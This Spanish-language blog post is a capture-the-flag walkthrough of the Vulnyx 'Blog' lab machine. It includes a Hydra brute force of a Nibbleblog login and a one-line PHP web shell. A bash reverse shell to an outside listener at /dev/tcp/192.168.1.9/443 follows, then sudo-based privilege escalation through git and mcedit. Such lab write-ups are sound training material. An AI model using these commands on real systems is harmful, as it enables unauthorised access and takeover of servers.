@@ -1,0 +1,185 @@
+---
+layout: post
+title: "Blog"
+date: 2024-04-22 11:55:23
+category: sample
+vm: vulnyx
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnyx/vulnyx.png" width=252></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Blog </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong>Link OVA:</strong><a href="https://vulnyx.com/#blog"> Vulnyx</a></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/vulnyx/blog/host.png){:.margin}
+
+**1\.** Vemos los dispositivos en nuestra red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/vulnyx/blog/arp_scan.png){:.margin}
+
+**2\.** Escaneamos puertos abiertos y versión de servicios que corren.
+
+`sudo nmap -p- -sS -T5 -sC -sV --min-rate=5000 --open -n -Pn 192.168.1.10 -oN report_scan`
+
+![img](/notas/public/img/vulnyx/blog/nmap.png){:.margin}
+
+**3\.** Ojeamos el servicio web de apache, vemos al parecer la salida de un comando.
+
+`htt://192.168.1.10/`
+
+![img](/notas/public/img/vulnyx/blog/80.png){:.margin}
+
+**4\.** Hacemos fuzzing de archivos y directorios.
+ 
+ `gobuster dir -u http://192.168.1.10/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt`
+
+![img](/notas/public/img/vulnyx/blog/gobuster.png){:.margin}
+
+**5\.** Vamos a la nueva ruta, tenemos una página.
+
+`http://192.168.1.10/my_weblog/`
+
+![img](/notas/public/img/vulnyx/blog/my_weblog.png){:.margin}
+
+**6\.** Presionamos `ctrl+u` para ver el código fuente, podemos ver que está a base de Nibbleblog.
+
+![img](/notas/public/img/vulnyx/blog/ctrl_u.png){:.margin}
+
+**7\.** Otra alternativa para ver la estructura de la web.
+
+`whatweb http://192.168.1.10/my:weblog/`
+
+![img](/notas/public/img/vulnyx/blog/whatweb.png){:.margin}
+
+**8\.** Seguimos fuzzeando ahora en la ruta my_weblog.
+
+`gobuster dir -u http://192.168.1.10/my_weblog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt`
+
+![img](/notas/public/img/vulnyx/blog/gobuster_weblog.png){:.margin}
+
+**9\.** Accedemos a admin.php , tenemos un panel login.
+
+`http://192.168.1.10/my_weblog/admin.php`
+
+![img](/notas/public/img/vulnyx/blog/login.png){:.margin}
+
+**10\.** En nibbleblog tenemos una ruta de usuarios.
+
+`http://192.168.1.10/my_weblog/content/private/users.xml`
+
+![img](/notas/public/img/vulnyx/blog/users.png){:.margin}
+
+**11\.** Presionamos f12, revisemos como se tramita el login.
+
+![img](/notas/public/img/vulnyx/blog/headers.png){:.margin}
+
+![img](/notas/public/img/vulnyx/blog/payload.png){:.margin}
+
+**12\.** Hacemos bruteforce al panel login teniendo el usuario.
+
+`hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -F -I`
+
+![img](/notas/public/img/vulnyx/blog/hydra.png){:.margin}
+
+**13\.** Creamos un archivo para subirlo y ejecutar comandos en la url.
+
+`nano shell.php`
+
+`<?php system($_GET["cmd"]);?>`
+
+![img](/notas/public/img/vulnyx/blog/shell.png){:.margin}
+
+_\- Subimos el archivo._
+![img](/notas/public/img/vulnyx/blog/upload.png){:.margin}
+
+**14\.** Si buscamos un exploit para nibbleblog encontramos la [ruta](https://www.exploit-db.com/exploits/38489) donde indica como encontrar nuestro archivo.
+
+![img](/notas/public/img/vulnyx/blog/path.png){:.margin}
+
+**15\.** Nos ponemos en escucha.
+
+![img](/notas/public/img/vulnyx/blog/nc.png){:.margin}
+
+**16\.** Enviamos la reverse_shell al nc.
+
+`http://192.168.1.10/my_weblog/content/private/plugins/my_image/image.php?cmd=bash -c "bash -i>%26/dev/tcp/192.168.1.9/443 0>%261"`
+
+_\- Aquí obtenemos la sessión._
+![img](/notas/public/img/vulnyx/blog/reverse_shell.png){:.margin}
+
+_\- Obtenemos la conexión._
+![img](/notas/public/img/vulnyx/blog/connected.png){:.margin}
+
+**17\.** Hacemos tratamiento de la tty.
+
+`script /dev/null -c bash`
+
+`ctrl+z`
+
+`stty raw -echo; fg`
+
+`reset xterm`
+
+`export SHELL=/bin/bash`
+
+`export TERM=xterm`
+
+![img](/notas/public/img/vulnyx/blog/stty.png){:.margin}
+
+![img](/notas/public/img/vulnyx/blog/stty2.png){:.margin}
+
+**18\.** Revisamos permisos sudo, podemos ejecutar git como admin.
+
+![img](/notas/public/img/vulnyx/blog/sudo_l_admin.png){:.margin}
+
+**19\.** Ganamos acceso como usuario admin.
+
+_\- Buscamos en [GTFobins](https://gtfobins.github.io/#git) como escalar:_
+
+`sudo -u admin git -p help config`
+
+`!/bin/bash`
+
+![img](/notas/public/img/vulnyx/blog/git.png){:.margin}
+
+**20\.** Volvemos a revisar permisos sudo, podemos ejecutar un binario como root.
+
+`sudo -l`
+
+![img](/notas/public/img/vulnyx/blog/sudo_l_root.png){:.margin}
+
+**21\.** Ganamos acceso como usuario root y leemos la flag.
+
+`sudo -u root mcedit`
+
+`F9 -> enter`
+
+`F11 -> enter`  ... _F9 -> U -> enter (alternativo)_
+
+`s -> enter`
+
+![img](/notas/public/img/vulnyx/blog/mcedit.png){:.margin}
+
+![img](/notas/public/img/vulnyx/blog/mcedit2.png){:.margin}
+
+![img](/notas/public/img/vulnyx/blog/flag.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
